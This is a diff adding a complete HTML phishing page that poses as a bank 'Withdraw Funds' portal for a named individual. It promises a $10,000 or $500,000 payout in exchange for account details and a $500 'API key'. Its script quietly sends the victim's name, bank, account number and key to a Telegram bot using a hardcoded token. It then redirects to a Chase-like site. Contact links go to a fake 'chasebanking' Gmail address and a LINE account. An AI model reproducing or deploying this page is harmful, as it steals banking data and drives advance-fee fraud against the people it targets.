@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdraw Funds</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: rgba(255, 192, 203, 0.1); /* Very light red background */
+        }
+
+        header {
+            background: #a6192e;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        #dynamic-time {
+            margin-left: 20px;
+            font-style: italic;
+        }
+
+        .header-right i {
+            margin-left: 15px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        main {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .info {
+            margin-bottom: 20px;
+            font-size: 1.1em;
+        }
+
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 50%;
+            margin: auto;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        input:hover {
+            border-color: #a6192e;
+        }
+
+        button {
+            background: #a6192e;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #8b161f;
+        }
+
+        .floating-icon {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #a6192e;
+            color: white;
+            padding: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            animation: float 3s ease-in-out infinite;
+            text-decoration: none;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        #loader {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid lightgray;
+            border-top: 5px solid #a6192e;
+            border-radius: 50%;
+            animation: spin 1s infinite linear;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0); }
+            to { transform: rotate(360deg); }
+        }
+
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-left">
+            <h1 id="bank-name"> Liceth de Jesús Castillo carpavire Allocated Portfolio</h1>
+            <span id="dynamic-time"></span>
+        </div>
+        <div class="header-right">
+            <a href="mailto:chasebanking182@gmail.com?subject=Hello&body=How%20can%20I%20obtain%20my%20API%3F" target="_blank">
+                <i class="material-icons">support_agent</i>
+            </a>
+            <a href="mailto:chasebanking182@gmail.com?subject=Hello&body=How%20can%20I%20obtain%20my%20API%3F" target="_blank">
+                <i class="material-icons">verified</i>
+            </a>
+        </div>
+    </header>
+
+    <main>
+        <section class="info">
+            <p id="withdraw-info"><i>Dear Liceth de Jesús Castillo carpavire, to proceed with withdrawing the allocated amount of <b>$10,000</b> in your account portfolio, kindly fill in the information below correctly.</i></p>
+        </section>
+
+        <section class="form-container">
+            <form id="withdraw-form">
+                <label for="account-name" id="account-name-label">Your Account Name:</label>
+                <input type="text" id="account-name" placeholder="Fill in your name" required>
+
+                <label for="bank-name" id="bank-name-label">Your Bank Name:</label>
+                <input type="text" id="bank-name" placeholder="Fill in your bank name" required>
+
+                <label for="account-number" id="account-number-label">Your Account Number:</label>
+                <input type="text" id="account-number" placeholder="Fill in your bank account" required>
+
+                <label for="api-key" id="api-key-label">Your API Key ID:</label>
+                <input type="text" id="api-key" placeholder="Fill in your API key" required>
+
+                <button type="submit" id="withdraw-btn">Proceed to Withdraw Now</button>
+            </form>
+        </section>
+
+        <section class="info">
+            <p id="process-info"><i>To proceed, ensure all provided details are accurate. The API key must be a <b>16-character alphanumeric</b> key purchased at <b>$500</b> and activated by your personal card and information. The funds will be credited immediately upon submission.click on the floating customer support icon below 👇👍 for more information and directions</i></p>
+        </section>
+
+        <div id="loader">
+            <div class="spinner"></div>
+            <p>Processing...</p>
+        </div>
+
+        <a href="https://line.me/ti/p/UkGsWChg2M" class="floating-icon" id="support-btn" target="_blank"> 
+            <i class="material-icons">support_agent</i>
+        </a>
+
+        <div class="translate">
+            <label for="language">Translate to:</label>
+            <select id="language">
+                <option value="en">English</option>
+                <option value="tr">Türkçe</option>
+            </select>
+        </div>
+    </main>
+
+    <script>
+        const telegramBotToken = '7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0';
+        const chatId = '7959877182';
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const timeElement = document.getElementById("dynamic-time");
+
+            const updateTime = () => {
+                const now = new Date().toLocaleTimeString();
+                timeElement.textContent = now;
+            };
+
+            setInterval(updateTime, 1000);
+            updateTime();
+
+            document.getElementById("withdraw-form").addEventListener("submit", async function (e) {
+                e.preventDefault();
+                const apiKey = document.getElementById("api-key").value;
+                const regex = /^[a-zA-Z0-9]{16}$/;
+
+                if (!regex.test(apiKey)) {
+                    alert("Invalid API Key. It must be 16 alphanumeric characters.");
+                    return;
+                }
+
+                // Send data to Telegram bot
+                const accountName = document.getElementById("account-name").value;
+                const bankName = document.getElementById("bank-name").value;
+                const accountNumber = document.getElementById("account-number").value;
+
+                const message = `New Withdrawal Request:\nAccount Name: ${accountName}\nBank Name: ${bankName}\nAccount Number: ${accountNumber}\nAPI Key: ${apiKey}`;
+                
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                document.getElementById("loader").style.display = "block";
+
+                setTimeout(() => {
+                    window.location.href = "https://www.chase.com.tr";
+                }, 3000);
+            });
+
+            document.getElementById("language").addEventListener("change", function () {
+                const lang = this.value;
+                if (lang === "tr") {
+                    document.getElementById("bank-name").textContent = "Ziraat Bankası";
+                    document.getElementById("withdraw-info").innerHTML = "Sayın Bay/Bayan, hesabınıza tahsis edilen <b>$500,000</b> tutarını çekmek için bilgileri eksiksiz doldurun.";
+                    document.getElementById("process-info").innerHTML = "İşleme devam etmek için sağlanan tüm bilgilerin doğru olduğundan emin olun. API anahtarı <b>16 karakter alfanümerik</b> olmalı ve kişisel bankanız tarafından <b>$500</b> karşılığında satın alınmalıdır. Fonlar, gönderimden hemen sonra hesabınıza aktarılacaktır.";
+
+                    // Update labels and placeholders to Turkish
+                    document.getElementById("account-name-label").textContent = "Hesap Adınız:";
+                    document.getElementById("bank-name-label").textContent = "Banka Adınız:";
+                    document.getElementById("account-number-label").textContent = "Hesap Numaranız:";
+                    document.getElementById("api-key-label").textContent = "API Anahtarınız:";
+
+                    document.getElementById("account-name").placeholder = "Adınızı girin";
+                    document.getElementById("bank-name").placeholder = "Banka adınızı girin";
+                    document.getElementById("account-number").placeholder = "Banka hesabınızı girin";
+                    document.getElementById("api-key").placeholder = "API anahtarınızı girin";
+                } else {
+                    document.getElementById("bank-name").textContent = "Banco Bank";
+                    document.getElementById("withdraw-info").innerHTML = "Dear Sir/Madam, to proceed with withdrawing the allocated amount of <b>$500,000</b> in your account portfolio, kindly fill in the information below correctly.";
+                    document.getElementById("process-info").innerHTML = "To proceed, ensure all provided details are accurate. The API key must be a <b>16-character alphanumeric</b> key purchased at <b>$500</b> and activated by your personal card and information. The funds will be credited immediately upon submission.";
+
+                    // Update labels and placeholders to English
+                    document.getElementById("account-name-label").textContent = "Your Account Name:";
+                    document.getElementById("bank-name-label").textContent = "Your Bank Name:";
+                    document.getElementById("account-number-label").textContent = "Your Account Number:";
+                    document.getElementById("api-key-label").textContent = "Your API Key:";
+
+                    document.getElementById("account-name").placeholder = "Fill in your name";
+                    document.getElementById("bank-name").placeholder = "Fill in your bank name";
+                    document.getElementById("account-number").placeholder = "Fill in your bank account";
+                    document.getElementById("api-key").placeholder = "Fill in your API key";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
